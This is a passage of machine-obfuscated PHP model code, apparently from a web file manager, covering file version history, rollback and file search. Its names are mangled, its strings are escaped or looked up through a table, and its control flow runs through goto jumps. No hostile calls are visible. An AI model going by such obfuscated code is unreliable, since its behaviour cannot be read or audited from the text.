"\151\x6f\137\163\x6f\x75\x72\143\145\x5f\150\x69\163\x74\157\162\x79"; public function historyCount($A’º‚»ô²å) { goto e­¤Àã©Ù; AÅŸÉƒÎ½: return array_to_keyvalue($dÏÓ¹Æè¨Í, $bµÅ‡¨ˆ±…[397], $bµÅ‡¨ˆ±…[494]); goto e’×…××İ; AÃà¨‹áÁŠ: $e±•í„Û²Æ = array($bµÅ‡¨ˆ±…[397], $bµÅ‡¨ˆ±…[1765] => $bµÅ‡¨ˆ±…[494]); $CÉ¬Ş‚„Ä‹ = array($bµÅ‡¨ˆ±…[397] => array($bµÅ‡¨ˆ±…[7], $A’º‚»ô²å)); $dÏÓ¹Æè¨Í = $this->field($e±•í„Û²Æ)->where($CÉ¬Ş‚„Ä‹)->group($bµÅ‡¨ˆ±…[397])->select(); goto AÅŸÉƒÎ½; e­¤Àã©Ù: $bµÅ‡¨ˆ±… =& $_SERVER[›é¼±]; if (!$A’º‚»ô²å) { return array(); } if (is_string($A’º‚»ô²å) || is_int($A’º‚»ô²å)) { $A’º‚»ô²å = array($A’º‚»ô²å); } goto AÃà¨‹áÁŠ; e’×…××İ: } public function addHistory($e×…‹®—™Î, $DÌ‹¿ìë = '') { $a ™‹›”Ûï =& $_SERVER[›é¼±]; $BâêêÌ”ÙÙ = array($a ™‹›”Ûï[412] => $e×…‹®—™Î[$a ™‹›”Ûï[397]], $a ™‹›”Ûï[1555] => isset($e×…‹®—™Î[$a ™‹›”Ûï[448]]) ? $e×…‹®—™Î[$a ™‹›”Ûï[448]] : $e×…‹®—™Î[$a ™‹›”Ûï[446]], $a ™‹›”Ûï[462] => $e×…‹®—™Î[$a ™‹›”Ûï[461]], $a ™‹›”Ûï[573] => $e×…‹®—™Î[$a ™‹›”Ûï[78]], $a ™‹›”Ûï[1964] => $DÌ‹¿ìë); $f£âŞ±¸Å = $GLOBALS[$a ™‹›”Ûï[6]][$a ™‹›”Ûï[88]][$a ™‹›”Ûï[1137]]; if ($f£âŞ±¸Å > 1) { $this->historyAutoClear($BâêêÌ”ÙÙ[$a ™‹›”Ûï[397]]); $this->add($BâêêÌ”ÙÙ); } Hook::trigger($a ™‹›”Ûï[1965], $BâêêÌ”ÙÙ); Model($a ™‹›”Ûï[1966])->eventFileEdit($e×…‹®—™Î[$a ™‹›”Ûï[397]]); } private function historyAutoClear($fÅÊËš§ ó) { goto e©ÓÑ¯Ëá·; A³œâ¼‹†Ÿ: $C²Æİ£µÚ… = $EöõŒ‚óê == $F¶–Ô‘Ë¤[1160] ? 5 : $e½ëé¨ˆƒœ; if ($e½ëé¨ˆƒœ <= 1) { $C²Æİ£µÚ… = 1; } if ($C²Æİ£µÚ… >= 500) { return; } goto F‡·×ã°­í; eœãŠ‡Ğî±: $aô¯É²Öé = array_slice($aô¯É²Öé, $C²Æİ£µÚ…); if (!$CË½¤èàå || !$aô¯É²Öé) { return; } $bÄ•†“ğÆÎ = array($F¶–Ô‘Ë¤[414] => array($F¶–Ô‘Ë¤[7], $CË½¤èàå)); goto C¢ŸáŠ‹¬¯; F‡·×ã°­í: $bÄ•†“ğÆÎ = array($F¶–Ô‘Ë¤[412] => $fÅÊËš§ ó); $Fàƒµ¥™Âà = $this->field($F¶–Ô‘Ë¤[1967])->where($bÄ•†“ğÆÎ)->order($F¶–Ô‘Ë¤[1961])->select(); if (!$Fàƒµ¥™Âà || $C²Æİ£µÚ… >= count($Fàƒµ¥™Âà)) { return; } goto d†Ë´í”Ú; e©ÓÑ¯Ëá·: $F¶–Ô‘Ë¤ =& $_SERVER[›é¼±]; $EöõŒ‚óê = Model($F¶–Ô‘Ë¤[765])->get($F¶–Ô‘Ë¤[1159]); $e½ëé¨ˆƒœ = $GLOBALS[$F¶–Ô‘Ë¤[6]][$F¶–Ô‘Ë¤[88]][$F¶–Ô‘Ë¤[1137]]; goto A³œâ¼‹†Ÿ; C¢ŸáŠ‹¬¯: $this->where($bÄ•†“ğÆÎ)->delete(); Model($F¶–Ô‘Ë¤[464])->remove($aô¯É²Öé); goto Cã¶ë‰ÂÃ; d†Ë´í”Ú: $CË½¤èàå = array_to_keyvalue($Fàƒµ¥™Âà, $F¶–Ô‘Ë¤[33], $F¶–Ô‘Ë¤[395]); $CË½¤èàå = array_slice($CË½¤èàå, $C²Æİ£µÚ…); $aô¯É²Öé = array_to_keyvalue($Fàƒµ¥™Âà, $F¶–Ô‘Ë¤[33], $F¶–Ô‘Ë¤[461]); goto eœãŠ‡Ğî±; Cã¶ë‰ÂÃ: } public function listData($C‹Ñ…ë»¿) { goto dóÉ ÏíŒ; Cî„„¢¥¸Š: $f³ÊÒí„ê¡ = 5; if ($dà§‰ÄÆğ == $BÒÅãÉóƒ[1160]) { $fğÃç©àµ[$BÒÅãÉóƒ[367]] = array_slice($fğÃç©àµ[$BÒÅãÉóƒ[367]], 0, $f³ÊÒí„ê¡); $fğÃç©àµ[$BÒÅãÉóƒ[364]] = array($BÒÅãÉóƒ[1969] => 1, $BÒÅãÉóƒ[1970] => 20, $BÒÅãÉóƒ[1971] => 1, $BÒÅãÉóƒ[1972] => count($fğÃç©àµ[$BÒÅãÉóƒ[367]])); } return $fğÃç©àµ; goto D•š‰ã‚ÔÖ; dóÉ ÏíŒ: $BÒÅãÉóƒ =& $_SERVER[›é¼±]; $dÙ¹ÙÅß­ã = array($BÒÅãÉóƒ[412] => $C‹Ñ…ë»¿); $F¨ÃÎÜİ¿¼ = $BÒÅãÉóƒ[1968]; goto B‡¼ñ£ñö; B‡¼ñ£ñö: $fğÃç©àµ = $this->field($F¨ÃÎÜİ¿¼)->where($dÙ¹ÙÅß­ã)->order($BÒÅãÉóƒ[1961])->selectPage(); $this->_listAppendUser($fğÃç©àµ[$BÒÅãÉóƒ[367]]); $dà§‰ÄÆğ = Model($BÒÅãÉóƒ[765])->get($BÒÅãÉóƒ[1159]); goto Cî„„¢¥¸Š; D•š‰ã‚ÔÖ: } protected function _listAppendUser(&$aŸÒŸÁ¼ã—) { $eÈŒï÷  =& $_SERVER[›é¼±]; $bóÚõÚÃŸ = array_to_keyvalue($aŸÒŸÁ¼ã—, $eÈŒï÷ [33], $eÈŒï÷ [1564]); $cÂå¬ÀçŒ„ = Model($eÈŒï÷ [532])->userListInfo($bóÚõÚÃŸ); foreach ($aŸÒŸÁ¼ã— as &$E„¶¶Öë†¤) { $Eˆ¨è‘ººË = $E„¶¶Öë†¤[$eÈŒï÷ [1564]]; $E„¶¶Öë†¤[$eÈŒï÷ [446]] = $cÂå¬ÀçŒ„[$Eˆ¨è‘ººË] ? $cÂå¬ÀçŒ„[$Eˆ¨è‘ººË] : !1; } unset($E„¶¶Öë†¤); } public function fileInfo($EàÒ¦öŠ¾¹) { $e®ˆõ£¦Ö‡ =& $_SERVER[›é¼±]; $DÀóö§ = $this->tablePrefix; $aÏ·¤İŸ´ = "{$DÀóö§}\x69\x6f\137\146\x69\x6c\145\x20\x66\x69\154\145\163\x20\x6f\x6e\40\x66\x69\154\145\x73\x2e\x66\151\154\x65\x49\104\x20\75\40\150\x69\163\164\x6f\x72\171\56\x66\x69\x6c\145\111\104"; return $this->alias($e®ˆõ£¦Ö‡[1973])->where(array($e®ˆõ£¦Ö‡[414] => $EàÒ¦öŠ¾¹))->join($aÏ·¤İŸ´, $e®ˆõ£¦Ö‡[1974])->find(); } public function removeItem($Aç¨éšÀÁ¡) { $BÃ§Ö„ ÎÖ =& $_SERVER[›é¼±]; $a¶ŠåÒùñµ = array($BÃ§Ö„ ÎÖ[414] => $Aç¨éšÀÁ¡); $bğ¬ÆèéÑ = $this->where($a¶ŠåÒùñµ)->find(); if ($bğ¬ÆèéÑ) { $fí»¦îÏ¹ = $this->where($a¶ŠåÒùñµ)->delete(); Model($BÃ§Ö„ ÎÖ[464])->remove($bğ¬ÆèéÑ[$BÃ§Ö„ ÎÖ[461]]); return $fí»¦îÏ¹; } return !1; } public function removeBySource($b´ãôä·ÚŒ) { goto dß¼ÀÒ‰…­; bŸ£¡øÊ¥İ: $còù„±ø¥Á = array($DÁ´İàÊø÷[412] => array($DÁ´İàÊø÷[7], $b´ãôä·ÚŒ)); $BÚËœ¦–¨„ = $this->field($DÁ´İàÊø÷[462])->where($còù„±ø¥Á)->select(); if ($BÚËœ¦–¨„) { $this->where($còù„±ø¥Á)->delete(); $a¤…‚×Àµç = array_to_keyvalue($BÚËœ¦–¨„, $DÁ´İàÊø÷[33], $DÁ´İàÊø÷[461]); Model($DÁ´İàÊø÷[464])->remove($a¤…‚×Àµç); } goto b‚¢ƒÁÂ—Ò; dß¼ÀÒ‰…­: $DÁ´İàÊø÷ =& $_SERVER[›é¼±]; if (!$b´ãôä·ÚŒ) { return !1; } if (!is_array($b´ãôä·ÚŒ)) { $b´ãôä·ÚŒ = array($b´ãôä·ÚŒ); } goto bŸ£¡øÊ¥İ; b‚¢ƒÁÂ—Ò: return !0; goto dÒ…˜ªÚİà; dÒ…˜ªÚİà: } public function setDetail($D”º˜„, $cğ„ƒ£Æ ) { $aãÑİŸÒ´â =& $_SERVER[›é¼±]; return $this->where(array($aãÑİŸÒ´â[414] => $D”º˜„))->save(array($aãÑİŸÒ´â[1964] => $cğ„ƒ£Æ )); } public function rollbackToItem($eØ÷ñêÖé», $CÊ­ÈŒÛ±œ) { goto A†‚…¦×à¨; A†‚…¦×à¨: $aÌÙË—×Üá =& $_SERVER[›é¼±]; $dŠµ‰Íº‹Ñ = Model($aÌÙË—×Üá[827])->sourceInfo($eØ÷ñêÖé»); $this->addHistory($dŠµ‰Íº‹Ñ, LNG($aÌÙË—×Üá[1975])); goto eŒ™îæôÚ; eŒ™îæôÚ: $CŞØæİùƒñ = $this->find($CÊ­ÈŒÛ±œ); $c‹ŒŒòœ´† = array($aÌÙË—×Üá[461] => $CŞØæİùƒñ[$aÌÙË—×Üá[461]], $aÌÙË—×Üá[78] => $CŞØæİùƒñ[$aÌÙË—×Üá[78]], $aÌÙË—×Üá[84] => time(), $aÌÙË—×Üá[448] => USER_ID); Model($aÌÙË—×Üá[827])->where(array($aÌÙË—×Üá[397] => $eØ÷ñêÖé»))->save($c‹ŒŒòœ´†); goto Bçï‡ÅƒØ; Bçï‡ÅƒØ: return $this->where(array($aÌÙË—×Üá[414] => $CÊ­ÈŒÛ±œ))->delete(); goto Dèäêõ˜Âí; Dèäêõ˜Âí: } public function clearSame($fñõ‰´¯Òò) { goto bä„Úö‘·ƒ; fÍ¹õêİŒ‹: $Dº‡„Ë®˜ = array(); $b±¡Ú¼Ù¦ = array(); foreach ($CŒéÑ”­ as $aíóáÏÊ…ø) { if (!$aíóáÏÊ…ø || count($aíóáÏÊ…ø) <= 1) { continue; } foreach ($aíóáÏÊ…ø as $bâÛóöÄ÷ç) { $Dº‡„Ë®˜[] = $bâÛóöÄ÷ç[$bÇõÀ¬Õ‚ƒ[461]]; $b±¡Ú¼Ù¦[] = $bâÛóöÄ÷ç[$bÇõÀ¬Õ‚ƒ[395]]; } } goto d©ŒÇ¾Ü…È; d©ŒÇ¾Ü…È: if (!$b±¡Ú¼Ù¦) { return; } $this->where(array($bÇõÀ¬Õ‚ƒ[395] => array($bÇõÀ¬Õ‚ƒ[7], $b±¡Ú¼Ù¦)))->delete(); Model($bÇõÀ¬Õ‚ƒ[464])->remove($Dº‡„Ë®˜); goto Aš£ˆ½äê¥; bä„Úö‘·ƒ: $bÇõÀ¬Õ‚ƒ =& $_SERVER[›é¼±]; $Eîîá¦˜˜Ï = $this->listData($fñõ‰´¯Òò); $CŒéÑ”­ = array_to_keyvalue_group($Eîîá¦˜˜Ï, $bÇõÀ¬Õ‚ƒ[461]); goto fÍ¹õêİŒ‹; Aš£ˆ½äê¥: } public function userSpace() { $d„Æ»Áâç´ =& $_SERVER[›é¼±]; $Cƒéò Ù„“ = $this->tablePrefix; $b½ë«¡Í°— = array($d„Æ»Áâç´[1555] => USER_ID); $Dë†™’Æã = "{$Cƒéò Ù„“}\151\157\x5f\146\151\x6c\145\40\146\151\154\x65\163\x20\157\156\40\146\x69\154\145\x73\x2e\146\x69\x6c\145\111\x44\x20\x3d\40\x68\151\163\164\157\162\171\56\146\x69\x6c\x65\x49\x44"; return $this->alias($d„Æ»Áâç´[1973])->where($b½ë«¡Í°—)->join($Dë†™’Æã, $d„Æ»Áâç´[1974])->sum($d„Æ»Áâç´[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($a¿‹½½²¸†) { goto dµ‘Şğ¤Ûº; dµ‘Şğ¤Ûº: $A°ì£·ôíÒ =& $_SERVER[›é¼±]; $d²±Œ¥…¤ = KodIO::fileTypeList(); $B¥ƒå³²³ = $d²±Œ¥…¤[$a¿‹½½²¸†]; goto fŒè¥âÎ‚Ş; dÂÙ×Şæ: if (!$B¥ƒå³²³[$A°ì£·ôíÒ[168]]) { $Eº¼ÍËáé = array_to_keyvalue($d²±Œ¥…¤, $A°ì£·ôíÒ[33], $A°ì£·ôíÒ[168]); $AÎ‰„‡½ã© = implode($A°ì£·ôíÒ[47], $Eº¼ÍËáé); $CêòöÆŒñÁ = $A°ì£·ôíÒ[1976]; } $FïÂ˜áêË¨ = explode($A°ì£·ôíÒ[47], trim($AÎ‰„‡½ã©, $A°ì£·ôíÒ[47])); return array($CêòöÆŒñÁ, $FïÂ˜áêË¨); goto Dšì‘µÜçù; fŒè¥âÎ‚Ş: if (!$B¥ƒå³²³) { return array(); } $AÎ‰„‡½ã© = $B¥ƒå³²³[$A°ì£·ôíÒ[168]]; $CêòöÆŒñÁ = $A°ì£·ôíÒ[7]; goto dÂÙ×Şæ; Dšì‘µÜçù: } public function listPathType($e›íµô—–) { $A©“©Ğ„âŒ =& $_SERVER[›é¼±]; $b‰Ô‚­à” = $this->fileTypeWhere($e›íµô—–); if (!$b‰Ô‚­à”) { return array(); } $E¸˜Ñ¬ßÁô = array($A©“©Ğ„âŒ[574] => SourceModel::TYPE_USER, $A©“©Ğ„âŒ[575] => USER_ID, $A©“©Ğ„âŒ[571] => 0, $A©“©Ğ„âŒ[572] => $b‰Ô‚­à”); return $this->listSource($E¸˜Ñ¬ßÁô); } public function listSearch($bÒ’Şê“™ô, $bøÙ‚Ì¢ã = 300) { goto Açë³¨˜æ; Açë³¨˜æ: $f´©›£‚Å™ =& $_SERVER[›é¼±]; if (isset($bÒ’Şê“™ô[$f´©›£‚Å™[1821]]) && $bÒ’Şê“™ô[$f´©›£‚Å™[1821]]) { $bÒ’Şê“™ô[$f´©›£‚Å™[1821]] = str_replace($f´©›£‚Å™[382], $f´©›£‚Å™[1977], trim($bÒ’Şê“™ô[$f´©›£‚Å™[1821]])); } $E´ñõŞ’ = $this->_parseSearchWhere($bÒ’Şê“™ô); goto A¦¼¸‘õÖ‹; d…‡Áª×Ÿö: $E´ñõŞ’ = $this->parseWhereLike($E´ñõŞ’); $BÒ„«ì¬´ï = $this->distinct(!0)->field($e¦÷‚½Şê)->where($E´ñõŞ’)->selectPage($bøÙ‚Ì¢ã); $this->_listSearchFileContent($BÒ„«ì¬´ï, $bÒ’Şê“™ô, $e˜ÍÎ…‡ñ¿, $D‹Éìõ­Ğ­); goto Fá°ƒˆö‡å; Fá°ƒˆö‡å: $this->_listSearchDesc($BÒ„«ì¬´ï, $bÒ’Şê“™ô, $e˜ÍÎ…‡ñ¿); $this->_listSearchTag($BÒ„«ì¬´ï, $bÒ’Şê“™ô, $e˜ÍÎ…‡ñ¿); $this->_listSearchGroupTag($BÒ„«ì¬´ï, $bÒ’Şê“™ô, $e˜ÍÎ…‡ñ¿); goto c‡Ú×º«; c‡Ú×º«: $this->_listDataApply($BÒ„«ì¬´ï[$f´©›£‚Å™[367]]); $this->_listMake($BÒ„«ì¬´ï); return $BÒ„«ì¬´ï; goto e­ƒïµİ•; aƒÀ¬îË÷Œ: $e˜ÍÎ…‡ñ¿ = $e¦÷‚½Şê; $this->_listSearchBindPinyin($bÒ’Şê“™ô, $E´ñõŞ’, $e¦÷‚½Şê); $this->alias($f´©›£‚Å™[438])->_makeOrder(); goto d…‡Áª×Ÿö; A¦¼¸‘õÖ‹: $D‹Éìõ­Ğ­ = $E´ñõŞ’; if (!isset($E´ñõŞ’[$f´©›£‚Å™[425]])) { $E´ñõŞ’[$f´©›£‚Å™[425]] = 0; } $e¦÷‚½Şê = $f´©›£‚Å™[1978]; goto aƒÀ¬îË÷Œ; e­ƒïµİ•: } private function _listSearchFileContent(&$d‹¿ÆÄÍ‹æ, $DİùÕª…òØ, $E²Ê£¯ƒƒø, $a¿š¹÷ªø) { goto B¿Ìº¸Œ’Ä; aİ¦ Ù¸³: $BëÊœ‘„æì = $this->field($E²Ê£¯ƒƒø)->where($a¿š¹÷ªø)->limit($Aš–œ¯İ±‘[1979])->select(); if (!$BëÊœ‘„æì || count($BëÊœ‘„æì) == 0) { return; } $d‹¿ÆÄÍ‹æ[$Aš–œ¯İ±‘[367]] = array_merge($BëÊœ‘„æì, $d‹¿ÆÄÍ‹æ[$Aš–œ¯İ±‘[367]]); goto A„â‚ÛØÓ‘; A„â‚ÛØÓ‘: $d‹¿ÆÄÍ‹æ[$Aš–œ¯İ±‘[364]][$Aš–œ¯İ±‘[365]] += count($BëÊœ‘„æì); goto Cçµ‰‚ôà×; BÚÉºäŠ‰³: $a¿š¹÷ªø[$Aš–œ¯İ±‘[461]] = array($Aš–œ¯İ±‘[7], $DİùÕª…òØ[$Aš–œ¯İ±‘[461]]); unset($a¿š¹÷ªø[$Aš–œ¯İ±‘[28]]); unset($DİùÕª…òØ[$Aš–œ¯İ±‘[461]]); goto aİ¦ Ù¸³; B¿Ìº¸Œ’Ä: $Aš–œ¯İ±‘ =& $_SERVER[›é¼±]; if (!$DİùÕª…òØ[$Aš–œ¯İ±‘[1821]] || $d‹¿ÆÄÍ‹æ[$Aš–œ¯İ±‘[364]][$Aš–œ¯İ±‘[351]] > 1) { return; } if (!isset($a¿š¹÷ªø[$Aš–œ¯İ±‘[28]]) || !is_array($DİùÕª…òØ[$Aš–œ¯İ±‘[461]])) { return; } goto BÚÉºäŠ‰³; Cçµ‰‚ôà×: } private function _listSearchTag(&$BÅÓÍÀ¨æÈ, $a¶¯”ÂÄÍ†, $dŒÄ–­ô‘Ê) { goto D—ØÅ©Ò§Õ; aë·¤¹î‰: $CÒØ«ù±ìÇ = array_to_keyvalue($CÒØ«ù±ìÇ, $c¢¸îÒäÍÅ[33], $c¢¸îÒäÍÅ[76]); $eé¥¼©‡Ã± = array_unique($CÒØ«ù±ìÇ); $this->_listSearchMerge($BÅÓÍÀ¨æÈ, $a¶¯”ÂÄÍ†, $dŒÄ–­ô‘Ê, $eé¥¼©‡Ã±); goto AŠ¶äŸ–°Ÿ; DŞ‚×³íí‚: if (!$Bîª×Î”­‚) { return; } $Bíœ˜£§ó© = array($c¢¸îÒäÍÅ[421] => array($c¢¸îÒäÍÅ[7], $Bîª×Î”­‚), $c¢¸îÒäÍÅ[1564] => USER_ID); $CÒØ«ù±ìÇ = Model($c¢¸îÒäÍÅ[422])->field($c¢¸îÒäÍÅ[76])->where($Bíœ˜£§ó©)->select(); goto aë·¤¹î‰; D—ØÅ©Ò§Õ: $c¢¸îÒäÍÅ =& $_SERVER[›é¼±]; if (!$a¶¯”ÂÄÍ†[$c¢¸îÒäÍÅ[1821]] || $BÅÓÍÀ¨æÈ[$c¢¸îÒäÍÅ[364]][$c¢¸îÒäÍÅ[351]] > 1) { return; } $a²®Ú¬·¼° = Model($c¢¸îÒäÍÅ[1980])->listData(); goto cğÃâŠ•ä; cğÃâŠ•ä: $Bîª×Î”­‚ = array(); $f±‚õ„à„ª = $a¶¯”ÂÄÍ†[$c¢¸îÒäÍÅ[1821]]; foreach ($a²®Ú¬·¼° as $C—™¬÷Ù®) { $aß”®ğÅ„» = $C—™¬÷Ù®[$c¢¸îÒäÍÅ[28]]; $E‹Í£À‚´£ = str_replace($c¢¸îÒäÍÅ[50], $c¢¸îÒäÍÅ[33], Pinyin::get($aß”®ğÅ„»)); if (stripos($aß”®ğÅ„», $f±‚õ„à„ª) !== !1 || stripos($E‹Í£À‚´£, $f±‚õ„à„ª) !== !1) { $Bîª×Î”­‚[] = $C—™¬÷Ù®[$c¢¸îÒäÍÅ[395]]; } } goto DŞ‚×³íí‚; AŠ¶äŸ–°Ÿ: } private function _listSearchDesc(&$c¹ñ·Ù¨È», $däÃ¶ç÷óÈ, $DÅÑêÕÀƒ) { goto E…È°¥¤È‚; cğ¿ŸóÖÔò: $b¶ğ»ö· = Model($eèİ©âŞ«š[557])->field($eèİ©âŞ«š[397])->where($Dó ¬®ãíÌ)->select(); $D„‰Ÿ’¥µÖ = array_to_keyvalue($b¶ğ»ö·, $eèİ©âŞ«š[33], $eèİ©âŞ«š[397]); $this->_listSearchMerge($c¹ñ·Ù¨È», $däÃ¶ç÷óÈ, $DÅÑêÕÀƒ, $D„‰Ÿ’¥µÖ); goto f»”ºäàÒ; E…È°¥¤È‚: $eèİ©âŞ«š =& $_SERVER[›é¼±]; if (!$däÃ¶ç÷óÈ[$eèİ©âŞ«š[1821]] || $c¹ñ·Ù¨È»[$eèİ©âŞ«š[364]][$eèİ©âŞ«š[351]] > 1) { return; } $dñéÓ›’ = $this->listSearchChildren($däÃ¶ç÷óÈ[$eèİ©âŞ«š[492]]); goto Fá±Âôªå; Fá±Âôªå: $dñéÓ›’ = array_unique($dñéÓ›’); if (!$dñéÓ›’) { return; } $Dó ¬®ãíÌ = array($eèİ©âŞ«š[397] => array($eèİ©âŞ«š[7], $dñéÓ›’), $eèİ©âŞ«š[93] => $eèİ©âŞ«š[445], $eèİ©âŞ«š[372] => array($eèİ©âŞ«š[381], $eèİ©âŞ«š[1823] . $däÃ¶ç÷óÈ[$eèİ©âŞ«š[1821]] . $eèİ©âŞ«š[1823])); goto cğ¿ŸóÖÔò; f»”ºäàÒ: } private function _listSearchGroupTag(&$dáöÆâ†Âø, $cçÊ³á…Ô×, $AØç¸ÀÊ˜¨) { goto EôÇÁäŠˆê; EôÇÁäŠˆê: $fÕÌ„±ˆ =& $_SERVER[›é¼±]; if (!$cçÊ³á…Ô×[$fÕÌ„±ˆ[1821]] || $dáöÆâ†Âø[$fÕÌ„±ˆ[364]][$fÕÌ„±ˆ[351]] > 1 || !$cçÊ³á…Ô×[$fÕÌ„±ˆ[492]]) { return; } $FæöŸæ¯é = $this->sourceInfo($cçÊ³á…Ô×[$fÕÌ„±ˆ[492]]); goto C‡„Ä¢ÆŠ; cƒïÈ—ã®Î: $C¢Õˆ‹Éï = array_to_keyvalue($C¢Õˆ‹Éï, $fÕÌ„±ˆ[33], $fÕÌ„±ˆ[76]); $dçõà®É¼˜ = array_unique($C¢Õˆ‹Éï); $this->_listSearchMerge($dáöÆâ†Âø, $cçÊ³á…Ô×, $AØç¸ÀÊ˜¨, $dçõà®É¼˜); goto F·òé±œŸ; C‡„Ä¢ÆŠ: if (!$FæöŸæ¯é || $FæöŸæ¯é[$fÕÌ„±ˆ[406]] != SourceModel::TYPE_GROUP) { return; } $a­ÙÇœõ‘§ = $FæöŸæ¯é[$fÕÌ„±ˆ[498]]; $BğÏæÛÚî = Model($fÕÌ„±ˆ[1981])->get($a­ÙÇœõ‘§); goto C°íõÌò; C°íõÌò: $BŒŸ³¬ŞÇ = array(); $aÛñŞ¼Í÷ç = $cçÊ³á…Ô×[$fÕÌ„±ˆ[1821]]; foreach ($BğÏæÛÚî[$fÕÌ„±ˆ[367]] as $FŸ™šåÕËÂ) { $cĞ¦Òæ£ÎÌ = $FŸ™šåÕËÂ[$fÕÌ„±ˆ[28]]; $D²ËØ‡¹ÔØ = str_replace($fÕÌ„±ˆ[50], $fÕÌ„±ˆ[33], Pinyin::get($cĞ¦Òæ£ÎÌ)); if (stripos($cĞ¦Òæ£ÎÌ, $aÛñŞ¼Í÷ç) !== !1 || stripos($D²ËØ‡¹ÔØ, $aÛñŞ¼Í÷ç) !== !1) { $BŒŸ³¬ŞÇ[] = $FŸ™šåÕËÂ[$fÕÌ„±ˆ[395]]; } } goto A±ØÑ©¢àé; A±ØÑ©¢àé: if (!$BŒŸ³¬ŞÇ) { return; } $bŸÁßÀà¸ = array($fÕÌ„±ˆ[421] => array($fÕÌ„±ˆ[7], $BŒŸ³¬ŞÇ), $fÕÌ„±ˆ[1564] => 0, $fÕÌ„±ˆ[29] => $fÕÌ„±ˆ[1845] . $a­ÙÇœõ‘§); $C¢Õˆ‹Éï = Model($fÕÌ„±ˆ[422])->field($fÕÌ„±ˆ[76])->where($bŸÁßÀà¸)->select(); goto cƒïÈ—ã®Î; F·òé±œŸ: } private function _listSearchMerge(&$bßÙÀ°áç, $AÈŒÈñºË¸, $AÀğß™„øç, $f‰ºù¬Ì„Ã) { goto bò¤‘ºçŞ¿; bò¤‘ºçŞ¿: $F¢¦Û¢¬Òó =& $_SERVER[›é¼±]; if (!$f‰ºù¬Ì„Ã) { return; } $cÑÆ…’†Ü = array_to_keyvalue($bßÙÀ°áç[$F¢¦Û¢¬Òó[367]], $F¢¦Û¢¬Òó[33], $F¢¦Û¢¬Òó[397]); goto aãö‡ô¿÷†; fğÕ´ùŞï: foreach ($b¨ñÈ…İ„¯ as $EğæÕÀçŠÀ) { if ($this->_listSearchFilter($EğæÕÀçŠÀ, $AÈŒÈñºË¸)) { $a§™Óƒóà¯[] = $EğæÕÀçŠÀ; } } $bßÙÀ°áç[$F¢¦Û¢¬Òó[367]] = array_merge($a§™Óƒóà¯, $bßÙÀ°áç[$F¢¦Û¢¬Òó[367]]); $bßÙÀ°áç[$F¢¦Û¢¬Òó[364]][$F¢¦Û¢¬Òó[365]] += count($a§™Óƒóà¯); goto BÁ½Œà†Æí; bÈ†èÅ‚¸‘: $b¨ñÈ…İ„¯ = $this->field($AÀğß™„øç)->where($b¶ ‘Úèè¸)->select(); if (!$b¨ñÈ…İ„¯) { return; } $a§™Óƒóà¯ = array(); goto fğÕ´ùŞï; aãö‡ô¿÷†: $c İÑÎ§°“ = array_diff($f‰ºù¬Ì„Ã, $cÑÆ…’†Ü); if (!$c İÑÎ§°“) { return; } $b¶ ‘Úèè¸ = array($F¢¦Û¢¬Òó[397] => array($F¢¦Û¢¬Òó[7], $c İÑÎ§°“)); goto bÈ†èÅ‚¸‘; BÁ½Œà†Æí: } private function _listSearchFilter($eÕõù‘Ù, $F¤ÊàĞ˜) { goto EğÚŞ‡ç; EğÚŞ‡ç: $DÍ®Ú×°‰ =& $_SERVER[›é¼±]; $f×ğí‚»Ë = $eÕõù‘Ù[$DÍ®Ú×°‰[405]] == $DÍ®Ú×°‰[87]; if (!strstr($eÕõù‘Ù[$DÍ®Ú×°‰[515]], $DÍ®Ú×°‰[47] . $F¤ÊàĞ˜[$DÍ®Ú×°‰[492]] . $DÍ®Ú×°‰[47])) { return !1; } goto dŠ«šâçó; dŠ«šâçó: if (isset($F¤ÊàĞ˜[$DÍ®Ú×°‰[407]]) && $F¤ÊàĞ˜[$DÍ®Ú×°‰[407]] != $DÍ®Ú×°‰[1787]) { if ($F¤ÊàĞ˜[$DÍ®Ú×°‰[407]] == $DÍ®Ú×°‰[77] && !$f×ğí‚»Ë) { return !1; } if ($F¤ÊàĞ˜[$DÍ®Ú×°‰[407]] != $DÍ®Ú×°‰[77] && $f×ğí‚»Ë) { return !1; } if (!strstr($eÕõù‘Ù[$DÍ®Ú×°‰[168]], $DÍ®Ú×°‰[47] . $F¤ÊàĞ˜[$DÍ®Ú×°‰[407]] . $DÍ®Ú×°‰[47])) { return !1; } } if (isset($F¤ÊàĞ˜[$DÍ®Ú×°‰[1982]]) && $F¤ÊàĞ˜[$DÍ®Ú×°‰[1982]] < $eÕõù‘Ù[$DÍ®Ú×°‰[78]]) { return !1; } if (isset($F¤ÊàĞ˜[$DÍ®Ú×°‰[1983]]) && $F¤ÊàĞ˜[$DÍ®Ú×°‰[1983]] > $eÕõù‘Ù[$DÍ®Ú×°‰[78]]) { return !1; } goto d›çê†øÎ; d›çê†øÎ: if (isset($F¤ÊàĞ˜[$DÍ®Ú×°‰[588]]) && $F¤ÊàĞ˜[$DÍ®Ú×°‰[588]] != $eÕõù‘Ù[$DÍ®Ú×°‰[448]]) { return !1; } return !0; goto a»ùé®; a»ùé®: } public function listSearchChildren($F¿ˆ®…¬‹, $c‡—éó«“– = 5000) { goto EĞ¯Õ›å‡¾; a™ÂÉğÖ¸: $D½ŠØ‚´Ø = $this->field($AÉ˜ùñ…øè[397])->where($EÚ¬óÓø©)->select(); $d­×‡Â»ŒÎ = array_to_keyvalue($D½ŠØ‚´Ø, $AÉ˜ùñ…øè[33], $AÉ˜ùñ…øè[397]); return $d­×‡Â»ŒÎ; goto a…¯™Õ„Ì‹; EĞ¯Õ›å‡¾: $AÉ˜ùñ…øè =& $_SERVER[›é¼±]; $d­×‡Â»ŒÎ = array(); $aĞ‡Äó¯‰ª = $this->sourceInfo($F¿ˆ®…¬‹); goto F¿àÇ‹ÆÜë; F¿àÇ‹ÆÜë: $EÚ¬óÓø© = array($AÉ˜ùñ…øè[515] => array($AÉ˜ùñ…øè[381], $aĞ‡Äó¯‰ª[$AÉ˜ùñ…øè[515]] . $aĞ‡Äó¯‰ª[$AÉ˜ùñ…øè[397]] . $AÉ˜ùñ…øè[539])); $EÛ†İÔ§Åİ = $this->field($AÉ˜ùñ…øè[397])->cache(null, 600)->where($EÚ¬óÓø©)->count(); if ($EÛ†İÔ§Åİ > $c‡—éó«“–) { return $this->_listSearchChildrenNear($F¿ˆ®…¬‹, $c‡—éó«“–); } goto a™ÂÉğÖ¸; a…¯™Õ„Ì‹: } private function _listSearchChildrenNear($EÏÚ…ÖÁ†, $AàÙÒ‹£í) { goto bàòÌÚĞà; bàòÌÚĞà: $f«÷ïè„Î£ =& 